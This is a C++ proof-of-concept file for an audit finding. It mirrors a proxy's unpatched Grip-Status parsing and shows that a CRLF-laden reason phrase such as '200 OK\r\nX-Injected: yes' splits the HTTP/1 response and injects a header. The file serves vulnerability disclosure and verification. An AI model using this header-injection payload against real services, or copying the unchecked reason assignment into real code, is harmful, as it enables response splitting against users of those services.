// PoC for finding 024: src/handler/instruct.cpp:222-242.
//
// When the upstream backend response carries a Grip-Status header, e.g.
//
//     Grip-Status: 200 OK
//
// Instruct::fromResponse splits the value at the first space, treating
// what's left of the space as the status code and what's right as the
// reason phrase. The reason is then assigned to newResponse.reason
// (line 242 unpatched) without rejecting CR or LF. That reason later hits
// the HTTP/1 status-line writer at src/core/http1/protocol.rs:987 which
// emits "{code} {reason}\r\n" verbatim.
//
// A malicious header such as
//
//     Grip-Status: 200 OK\r\nX-Injected: yes
//
// produces an injected header line on the downstream HTTP/1 response.

#include <cstdio>
#include <string>
#include <utility>
#include <vector>

using Header = std::pair<std::string, std::string>;
using Headers = std::vector<Header>;

struct Response {
    int code = 200;
    std::string reason = "OK";
    Headers headers;
    std::string body;
};

// Mirrors src/handler/instruct.cpp:222-243 (unpatched).
//   QByteArray statusHeader = response.headers.get("Grip-Status").asQByteArray();
//   if (!statusHeader.isEmpty()) {
//       int at = statusHeader.indexOf(' ');
//       ...
//       newResponse.code = codeStr.toInt(...);
//       newResponse.reason = reason;
//   }
static bool applyGripStatus(Response *r, const std::string &statusHeader) {
    if (statusHeader.empty())
        return true;

    auto sp = statusHeader.find(' ');
    std::string codeStr, reason;
    if (sp != std::string::npos) {
        codeStr = statusHeader.substr(0, sp);
        reason = statusHeader.substr(sp + 1);
    } else {
        codeStr = statusHeader;
    }

    int code = std::atoi(codeStr.c_str());
    if (code < 0 || code > 999)
        return false;

    r->code = code;
    // Unpatched line 242: assigned verbatim, no CR/LF rejection.
    r->reason = reason;
    return true;
}

// Mirrors src/core/http1/protocol.rs:981-1001.
static std::string serializeHttp1(const Response &r) {
    std::string out = "HTTP/1.1 " + std::to_string(r.code) + " " + r.reason + "\r\n";
    for (const auto &h : r.headers)
        out += h.first + ": " + h.second + "\r\n";
    out += "\r\n";
    out += r.body;
    return out;
}

static std::string escape(const std::string &s) {
    std::string o;
    for (char c : s) {
        switch (c) {
        case '\r': o += "\\r"; break;
        case '\n': o += "\\n"; break;
        default:   o += c;
        }
    }
    return o;
}

int main() {
    // Verbatim bytes the backend would send (already CRLF-decoded since the
    // outer Grip-Status header value carries them as raw bytes by this stage).
    const std::string statusHeader = std::string("200 OK\r\nX-Injected: yes");

    std::printf("=== Attacker Grip-Status header value (escaped) ===\n%s\n\n",
                escape(statusHeader).c_str());

    Response r;
    r.body = "hello";
    if (!applyGripStatus(&r, statusHeader)) {
        std::puts("Grip-Status rejected unexpectedly");
        return 2;
    }

    std::string wire = serializeHttp1(r);

    std::printf("=== Resulting HTTP/1 bytes (escaped) ===\n%s\n",
                escape(wire).c_str());
    std::printf("=== Resulting HTTP/1 bytes (raw) ===\n%s\n", wire.c_str());

    bool injected = wire.find("HTTP/1.1 200 OK\r\nX-Injected: yes\r\n") != std::string::npos;

    if (injected) {
        std::puts("RESULT: vulnerable. Grip-Status reason carried CRLF through to the");
        std::puts("        HTTP/1 status line, splitting the response and injecting");
        std::puts("        an attacker-controlled header.");
        return 0;
    }

    std::puts("RESULT: did not reproduce");
    return 1;
}
